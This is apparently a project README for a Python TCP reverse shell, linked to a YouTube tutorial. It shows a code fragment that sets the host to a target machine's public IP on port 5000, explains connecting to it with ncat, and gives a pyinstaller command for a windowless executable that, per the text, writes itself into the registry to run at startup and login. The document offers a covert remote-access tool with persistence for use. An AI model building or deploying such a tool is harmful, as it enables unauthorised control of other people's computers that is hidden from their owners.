# Python-TCP-Reverse-Shell
Python TCP reverse shell &amp; persistence &amp; exe &amp; more! (Also with YouTube  tuturial)

## YouTube Tutorial
https://www.youtube.com/watch?v=S2vXQ27O944&t=

To run this over the internet you change the HOST to the public ip of the target machine. To do this we can use the CommonData class and the public_ip method. 

```
class reverseShell:
    # Class variables
    d = CommonData() <--- HERE we create object of the CommonData() class
    HOST = d.public_ip <--- HERE we use the method public_ip and use the IP(target machines IP) that is returned for the host
    PORT = 5000
    BUFF_SIZE = 2048
........
........
........
```

and then you use ncat with target machine ip and the port 5000 (or whatever you change it to in the script).

Persistence is gainged when creating an exe using pyinstaller like 
```
pyinstaller -w --onefile revShell_server.py
```
It will add the exe to the registry and will start up on machine startup and user login.

This is part 1 atm and I will build on it more in the future and create a tutorial to go with it for anyone that is interested.
